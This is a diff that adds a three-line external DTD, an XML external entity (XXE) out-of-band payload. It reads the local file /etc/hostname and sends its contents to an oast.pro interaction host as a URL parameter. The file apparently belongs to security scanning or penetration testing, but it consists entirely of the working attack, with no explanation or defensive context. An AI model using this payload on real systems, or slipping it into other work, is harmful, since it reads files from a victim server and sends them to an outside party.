@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://48003a0a0673a30bd409guidijyyyyyyn.oast.pro/?data=%file;'>">
+%all;
